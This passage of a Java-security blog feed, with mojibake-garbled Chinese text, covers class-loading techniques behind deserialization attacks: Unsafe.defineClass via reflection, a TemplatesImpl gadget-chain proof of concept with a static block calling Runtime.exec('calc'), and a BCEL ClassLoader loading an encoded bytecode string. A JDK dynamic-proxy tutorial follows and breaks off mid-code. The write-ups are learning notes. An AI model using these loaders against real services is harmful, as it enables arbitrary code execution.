æ–¹æ³•å…¨éƒ¨ç§æœ‰åŒ–ï¼Œæ‰€ä»¥éœ€è¦ä½¿ç”¨åå°„è·å–ç±»å¯¹è±¡</p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601061035596.png" alt="image-20260106103513045" style="zoom:80%;" /><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;C:\\Users\\32768\\Desktop\\CL8.class&quot;</span>));</span><br><span class="line"><span class="type">ClassLoader</span> <span class="variable">cl</span> <span class="operator">=</span> ClassLoader.getSystemClassLoader();</span><br><span class="line"></span><br><span class="line">Class&lt;Unsafe&gt; unsafeClass = Unsafe.class;</span><br><span class="line"><span class="comment">//æ‹¿åˆ° Unsafe è¿™ä¸ªç±»çš„ Class å¯¹è±¡ï¼ˆåå°„å…¥å£ï¼‰</span></span><br><span class="line"></span><br><span class="line"><span class="type">Field</span> <span class="variable">theUnsafeField</span> <span class="operator">=</span> unsafeClass.getDeclaredField(<span class="string">&quot;theUnsafe&quot;</span>);</span><br><span class="line"><span class="comment">//getDeclaredField ä¼šæ‹¿åˆ° æœ¬ç±»è‡ªå·±å£°æ˜çš„å­—æ®µï¼ˆåŒ…æ‹¬ privateï¼‰</span></span><br><span class="line"></span><br><span class="line">theUnsafeField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Unsafe</span> <span class="variable">unsafe</span> <span class="operator">=</span> (Unsafe) theUnsafeField.get(<span class="literal">null</span>);</span><br><span class="line"><span class="comment">//Field.get(obj) é‡Œä¼  nullï¼Œè¡¨ç¤ºå–çš„æ˜¯é™æ€å­—æ®µï¼ˆstatic ä¸éœ€è¦å¯¹è±¡å®ä¾‹ï¼‰</span></span><br><span class="line"></span><br><span class="line">Class&lt;?&gt; aClass = unsafe.defineClass(<span class="string">&quot;CL8&quot;</span>, code, <span class="number">0</span>, code.length, cl, <span class="literal">null</span>);</span><br><span class="line">aClass.newInstance();</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="4-TemplatesImpl"><a href="#4-TemplatesImpl" class="headerlink" title="4.TemplatesImpl"></a>4.<code>TemplatesImpl</code></h3><p>è¿™ä¸ªç±»çš„ä½œç”¨ä¸»è¦æ˜¯</p><p><strong>æŠŠâ€œå·²ç¼–è¯‘çš„ XSLTï¼ˆtransletï¼‰â€ç¼“å­˜èµ·æ¥ï¼Œå¹¶ä¸”èƒ½éšæ—¶ new å‡º Transformer æ¥æ‰§è¡Œè½¬æ¢ã€‚</strong></p><p>ä½†æ˜¯å®ƒé‡Œé¢æœ‰ä¸€ä¸ªå†…éƒ¨ç±»ä¸­å®šä¹‰äº†ä¸€ä¸ªæ–¹æ³•defineClass,ä»–æ˜¯é»˜è®¤çš„defautæ–¹æ³•ï¼Œæ‰€ä»¥å¯ä»¥è¢«åŒåŒ…ä¸‹å¤–éƒ¨ç±»è°ƒç”¨</p><p><strong>å®ƒä¸æ˜¯åœ¨é‡å†™ <code>ClassLoader#defineClass(...)</code></strong>ï¼Œå®ƒæ˜¯åœ¨ <strong>æ–°å¢&#x2F;é‡è½½ï¼ˆoverloadï¼‰ä¸€ä¸ªâ€œåŒ…è£…æ–¹æ³•â€</strong></p><p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601061406286.png" alt="image-20260106140603165"></p><p>äºæ˜¯æˆ‘ä»¬å°è¯•æ„é€ åˆ©ç”¨é“¾</p><p><strong>ä¸‹é¢é“¾ä¸­é¡¶éƒ¨çš„ä¿©ä¸ªæ–¹æ³•éƒ½æ˜¯å…¬å¼€å¯ä»¥ç›´æ¥è°ƒç”¨</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> Transformer <span class="title function_">newTransformer</span><span class="params">()</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> Properties <span class="title function_">getOutputProperties</span><span class="params">()</span> &#123;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">TemplatesImpl#</span><span class="language-bash">getOutputProperties() -&gt; TemplatesImpl#newTransformer() -&gt;</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">TemplatesImpl#</span><span class="language-bash">getTransletInstance() -&gt; TemplatesImpl#defineTransletClasses()</span></span><br><span class="line">//getTransletInstance()åœ¨è°ƒç”¨å®ŒdefineTransletClasses()æ–¹æ³•åï¼Œå¯¹å…¶è¿”å›çš„ç±»åšäº†å®ä¾‹åŒ–ï¼Œä»è€Œæ‰§è¡Œæˆ‘ä»¬ç±»ä¸­çš„é™æ€ä»£ç å—</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">-&gt; </span><span class="language-bash">TransletClassLoader#defineClass()</span></span><br></pre></td></tr></table></figure><p><code>TemplatesImpl</code><strong>ç±»å±æ€§èµ‹å€¼</strong></p><ul><li><p><code>_name</code>å±æ€§ä¸èƒ½ä¸ºç©º</p><p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601061341059.png" alt="image-20260106134146495"></p></li><li><p><code>_bytecodes</code>è¿™ä¸ªå±æ€§ä¸èƒ½ä¸ºç©º</p><p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601061344678.png" alt="image-20260106134407579"></p></li></ul><p><code>AbstractTranslet</code><strong>å­ç±»é™åˆ¶</strong></p><ul><li><p><code>getTransletInstance()</code>ä¼šå¯¹ç±»è¿›è¡Œå¼ºè½¬</p><p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601061437425.png" alt="image-20260106143730113"></p><p>ä¸€ä¸ªå¼ºåˆ¶è½¬æ¢ä¸º<code>AbstractTranslet</code>å­ç±»ï¼Œä¸€ä¸ªè¿›è¡Œå®ä¾‹åŒ–</p></li><li><p><code>defineTransletClasses</code>ä¼šä¾æ¬¡æ£€æŸ¥ç±»</p><p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601061435038.png" alt="image-20260106143454039"></p></li></ul><p><strong>å°è¯•åˆ©ç”¨</strong></p><ul><li><p>åˆ©ç”¨ poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> TransformerConfigurationException, IOException, NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">    <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;C:\\Users\\32768\\Desktop\\CL8.class&quot;</span>));</span><br><span class="line">    </span><br><span class="line">    <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">  </span><br><span class="line">    <span class="comment">//åå°„ä¿®æ”¹å†…éƒ¨å±æ€§</span></span><br><span class="line">    setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;code&#125;);</span><br><span class="line">    setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">    setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">    obj.newTransformer();<span class="comment">//è°ƒç”¨å¯åŠ¨æ–¹æ³•</span></span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String bytecodes, Object bytes)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">    <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(bytecodes);</span><br><span class="line">    field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    field.set(obj, bytes);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>æ¶æ„å¤–éƒ¨ç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloTranslet</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);<span class="comment">//æµ‹è¯•</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException var1) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(var1);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// XSLTC å¸¸è§çš„ transform å…¥å£ 1ï¼šDOM + å¤šä¸ªè¾“å‡º handler</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line">        <span class="comment">// æ¼”ç¤ºï¼šä»€ä¹ˆéƒ½ä¸åš</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// XSLTC å¸¸è§çš„ transform å…¥å£ 2ï¼šDOM + iterator + å•ä¸ªè¾“å‡º handler</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span></span><br><span class="line">            <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line">        <span class="comment">// æ¼”ç¤ºï¼šä»€ä¹ˆéƒ½ä¸åš</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p><strong>æˆåŠŸ</strong></p><p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601061455372.png" alt="image-20260106145552294"></p></li></ul><h3 id="5-BCEL-ClassLoader"><a href="#5-BCEL-ClassLoader" class="headerlink" title="5.BCEL ClassLoader"></a>5.<code>BCEL ClassLoader</code></h3><ul><li>BCEL æä¾›çš„ä¸€ç§æœºåˆ¶ï¼š<strong>æŠŠå­—èŠ‚ç ç¼–ç è¿›å­—ç¬¦ä¸²é‡Œï¼Œå†é€šè¿‡ç‰¹æ®Š ClassLoader ä»å­—ç¬¦ä¸²è¿˜åŸå¹¶åŠ è½½ç±»</strong>ã€‚å®ƒåœ¨å®‰å…¨é¢†åŸŸé‡Œä¹‹æ‰€ä»¥â€œå‡ºåâ€ï¼Œæ˜¯å› ä¸ºå¦‚æœè¿™ä¸²å­—ç¬¦ä¸²æ¥è‡ªä¸å¯ä¿¡è¾“å…¥ï¼Œå°±å¯èƒ½å˜æˆ<strong>ä»»æ„ä»£ç æ‰§è¡Œçš„å…¥å£</strong>ï¼ˆå¾ˆå¤šå†å²æ¼æ´é“¾å–œæ¬¢ç”¨å®ƒï¼‰ã€‚BCEL çš„å®˜æ–¹æ–‡æ¡£ä¹Ÿæ˜ç¡®æè¿°äº† <code>$$BCEL$$</code> è¿™ç§â€œç‰¹æ®Šè¯·æ±‚æ ¼å¼â€</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.leavesongs.com/PENETRATION/where-is-bcel-classloader.html</span><br></pre></td></tr></table></figure><ul><li><strong>è¿™æ˜¯ä¸€ä¸ªâ€œèƒ½åœ¨åŠ è½½ Class çš„è¿‡ç¨‹ä¸­ï¼ŒæŠŠ class æ–‡ä»¶å…ˆè§£ææˆ BCEL çš„</strong> <code>JavaClass</code> <strong>å¯¹è±¡ã€å…è®¸ä¿®æ”¹åï¼Œå†æŠŠå­—èŠ‚ç å–‚å› JVM defineClass çš„ç±»åŠ è½½å™¨â€</strong></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">JavaClass</span> <span class="variable">cls</span> <span class="operator">=</span> Repository.lookupClass(CL8.class);</span><br><span class="line"><span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> Utility.encode(cls.getBytes(), <span class="literal">true</span>);</span><br><span class="line">System.out.println(code);</span><br></pre></td></tr></table></figure><p><strong>åˆ©ç”¨</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ClassLoader</span>().loadClass(<span class="string">&quot;$$BCEL$$&quot;</span> + <span class="string">&quot;$l$8b$I$A$A$A$A$A$A$Am$91Ko$d3$40$U$85$cf$qn$ec$Y$9b$b6$vIKy$W$faH$ba$mB$b0$40J$c5$a6$C$Ja$u$oU$Q$cb$c9t$9aN$eb$da$95$ed$94$fe$p$d6$dd$A$C$J$f6$fc$u$c4$ZS$85$88b$c9s$l$e7$deo$ee$cc$fc$fc$f5$f5$3b$80$c7h$fb$a8c$c9$c7u$y$7b$b8a$edM$X$b7$5c$dc$f6Q$c3$j$Xw$5d$ac$I$d4$b6Lb$8a$a7$C$d5vg$m$e0l$a7$7bZ$6062$89$7e$3d$3e$k$ealW$Ocf$gQ$aad$3c$90$99$b1$f1E$d2$v$OL$$0$l$a9X$e6y$9c$ca$3d$9du$b7$a3$t$3d$BoK$c5$Xd$e7Tf$P$F$9a$d1$a1$3c$95$5d$93v_$ec$3c$3bS$fa$a40i$c2$ca$b0_Hu$f4J$9e$94P$8e$u$e0$f7$d3q$a6$f4sc7$f1$I$7c$60$5b$D$f8$b8$e2$e2$5e$80$fbX$r$96$f3$a8$AkX$XX$f8$PZ$60$b9$cc$c62$Zu$df$8e$93$c2$i$eb$89hY$h$3c$e7$3f$83$L$cc$fd$ed$d9$Z$kjU$f0x$970$9cp$a4$8bI$d0lw$a2K5$3c$99$a3$cf$b4$S$d8hO$a9$fd$o3$c9$a87$dd$f0$sK$95$ces6$yMW$ee$kd$e9$H$7b$r$bd$ce$A$x$f0$f8$9a$f6$ab$40$d8$7b$e0$g0zD$xhg6$3fC$9c$97r$c8$d5$a7$F$h$izW$e9$F$7f$8a0$8b9Z$P$f3$T$c0$3e$aa$a5$b6$f8$F$95F$f5$T$9cw$l$R$be$fc$86$da$7b$S$dd$l$e7$a5Xg$e9$M$L$z$baE$P$84$d6$J$J$I$M$89l$a11$d9$s$a4$d2$c0$C$a3k$fc$5dT$o$X$cd$3a$85V9$dd$e2o$802$A$f6$a0$C$A$A&quot;</span>).newInstance();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p><strong>æˆåŠŸ</strong></p><p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601061746455.png" alt="image-20260106174621108"></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> javaå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> javaå®‰å…¨ </tag>
            
            <tag> ååºåˆ—åŒ– </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>javaå®‰å…¨-åŠ¨æ€ä»£ç†</title>
      <link href="/2026/01/06/dynamicproxy/"/>
      <url>/2026/01/06/dynamicproxy/</url>
      
        <content type="html"><![CDATA[<h1 id="javaå®‰å…¨-åŠ¨æ€ä»£ç†"><a href="#javaå®‰å…¨-åŠ¨æ€ä»£ç†" class="headerlink" title="javaå®‰å…¨-åŠ¨æ€ä»£ç†"></a>javaå®‰å…¨-åŠ¨æ€ä»£ç†</h1><h2 id="ä¸€ã€é™æ€ä»£ç†"><a href="#ä¸€ã€é™æ€ä»£ç†" class="headerlink" title="ä¸€ã€é™æ€ä»£ç†"></a>ä¸€ã€é™æ€ä»£ç†</h2><p>æœ¬è´¨å°±æ˜¯ï¼š<strong>ä»£ç†ç±»å’ŒçœŸå®ç±»å®ç°åŒä¸€ä¸ªæ¥å£</strong>ï¼Œä»£ç†é‡Œâ€œåŒ…ä¸€å±‚â€çœŸå®å¯¹è±¡ã€‚</p><h3 id="1-ä¸šåŠ¡æ¥å£"><a href="#1-ä¸šåŠ¡æ¥å£" class="headerlink" title="1.ä¸šåŠ¡æ¥å£"></a>1.ä¸šåŠ¡æ¥å£</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">PayService</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">pay</span><span class="params">(<span class="type">int</span> amount)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-çœŸå®å¯¹è±¡"><a href="#2-çœŸå®å¯¹è±¡" class="headerlink" title="2.çœŸå®å¯¹è±¡"></a>2.çœŸå®å¯¹è±¡</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PayServiceImpl</span> <span class="keyword">implements</span> <span class="title class_">PayService</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">pay</span><span class="params">(<span class="type">int</span> amount)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;pay &quot;</span> + amount);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-ä»£ç†å¯¹è±¡ï¼ˆæ‰‹å†™ï¼‰"><a href="#3-ä»£ç†å¯¹è±¡ï¼ˆæ‰‹å†™ï¼‰" class="headerlink" title="3.ä»£ç†å¯¹è±¡ï¼ˆæ‰‹å†™ï¼‰"></a>3.ä»£ç†å¯¹è±¡ï¼ˆæ‰‹å†™ï¼‰</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PayServiceProxy</span> <span class="keyword">implements</span> <span class="title class_">PayService</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> PayService target;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">PayServiceProxy</span><span class="params">(PayService target)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.target = target;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">pay</span><span class="params">(<span class="type">int</span> amount)</span> &#123;</span><br><span class="line">        <span class="type">long</span> <span class="variable">t0</span> <span class="operator">=</span> System.nanoTime();</span><br><span class="line">        System.out.println(<span class="string">&quot;[LOG] before pay&quot;</span>);</span><br><span class="line">        target.pay(amount);</span><br><span class="line">        System.out.println(<span class="string">&quot;[LOG] after pay, cost=&quot;</span> + (System.nanoTime() - t0));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-ä½¿ç”¨"><a href="#4-ä½¿ç”¨" class="headerlink" title="4.ä½¿ç”¨"></a>4.ä½¿ç”¨</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">PayService</span> <span class="variable">proxy</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PayServiceProxy</span>(<span class="keyword">new</span> <span class="title class_">PayServiceImpl</span>());</span><br><span class="line">        proxy.pay(<span class="number">100</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>æœ€ç»ˆå®ç°</strong></p><p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601041743581.png" alt="image-20260104174244548"></p><p><strong>payæ–¹æ³•ï¼Œå‰åéƒ½å®ç°äº†åŠŸèƒ½å¢å¼º</strong></p><p><strong>ç¼ºç‚¹ï¼š</strong></p><p>æ¯ä¸ªæ¥å£éƒ½è¦æ‰‹å†™ä¸€ä¸ª Proxy ç±»ï¼Œå¤ªç´¯</p><p>æƒ³è¦åœ¨åŒä¸€ä¸ªæŸä¸€ä¸ªæ¥å£ä¸­çš„æ‰€æœ‰æ–¹æ³•è¿›è¡Œå¤„ç†åŒæ ·çš„äº‹æƒ…ï¼Œé™æ€ä»£ç†ç±»ä¸­çš„æ¯ä¸€ä¸ªæ–¹æ³•éƒ½éœ€è¦é‡å†™ã€‚</p><h2 id="äºŒã€åŠ¨æ€ä»£ç†"><a href="#äºŒã€åŠ¨æ€ä»£ç†" class="headerlink" title="äºŒã€åŠ¨æ€ä»£ç†"></a>äºŒã€åŠ¨æ€ä»£ç†</h2><p>é™æ€ä»£ç†çš„é—®é¢˜ï¼šæ¯ä¸ªæ¥å£éƒ½å¾—å†™ä¸€ä¸ª <code>XXXProxy</code> ç±»ï¼Œå¤ªéº»çƒ¦<br> åŠ¨æ€ä»£ç†å°±æ˜¯ï¼š<strong>åªéœ€è¦å†™ä¸€ä¸ª Proxy ç±»</strong>ï¼ŒJDK è¿è¡Œæ—¶ç›´æ¥ç”Ÿæˆã€‚</p><h3 id="1-InvocationHandlerç±»"><a href="#1-InvocationHandlerç±»" class="headerlink" title="1.InvocationHandlerç±»"></a>1.InvocationHandlerç±»</h3><p>æ‰€æœ‰æ–¹æ³•éƒ½ä¼šè¿›è¿™é‡Œï¼ˆç›¸å½“äºâ€œé€šç”¨ä»£ç†é€»è¾‘â€ï¼‰</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TimingLogHandler</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// çœŸå®å¯¹è±¡ï¼ˆè¢«ä»£ç†å¯¹è±¡ï¼‰</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Object target;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">TimingLogHandler</span><span class="params">(Object target)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.target = target;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// proxyï¼šç”Ÿæˆå‡ºæ¥çš„ä»£ç†å¯¹è±¡æœ¬èº«</span></span><br><span class="line">    <span class="comment">// methodï¼šè¿™æ¬¡è°ƒç”¨çš„æ˜¯å“ªä¸ªæ–¹æ³•ï¼ˆä¾‹å¦‚ payï¼‰</span></span><br><span class="line">    <span class="comment">// argsï¼šè¿™æ¬¡è°ƒç”¨çš„å‚æ•°ï¼ˆä¾‹å¦‚ 100ï¼‰</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// æ–¹æ³•è°ƒç”¨å‰å¢å¼º</span></span><br><span class="line">        <span class="type">long</span> <span class="variable">t0</span> <span class="operator">=</span> System.nanoTime();</span><br><span class="line">        System.out.println(<span class="string">&quot;ã€åŠ¨æ€ä»£ç†ã€‘before &quot;</span> + method.getName());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// å…³é”®ï¼šåå°„è°ƒç”¨çœŸå®å¯¹è±¡çš„æ–¹æ³•</span></span><br><span class="line">        <span class="comment">// ç­‰ä»·äº target.pay(100) è¿™ç§æ•ˆæœ</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> method.invoke(target, args);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// æ–¹æ³•è°ƒç”¨åå¢å¼º</span></span><br><span class="line">        System.out.println(<span class="string">&quot;ã€åŠ¨æ€ä»£ç†ã€‘after &quot;</span> + method.getName()</span><br><span class="line">                + <span class="string">&quot;, cost=&quot;</span> + (System.nanoTime() - t0));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> result; <span class="comment">// å¦‚æœæ–¹æ³•æœ‰è¿”å›å€¼ï¼Œè¿™é‡Œè¦è¿”å›ï¼›void çš„è¯å°±æ˜¯ null</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-åˆ›å»ºä»£ç†å¯¹è±¡"><a href="#2-åˆ›å»ºä»£ç†å¯¹è±¡" class="headerlink" title="2.åˆ›å»ºä»£ç†å¯¹è±¡"></a>2.åˆ›å»ºä»£ç†å¯¹è±¡</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">PayService</span> <span class="variable">target</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PayServiceImpl</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è®© JDK ç”Ÿæˆä¸€ä¸ªâ€œå®ç° PayService 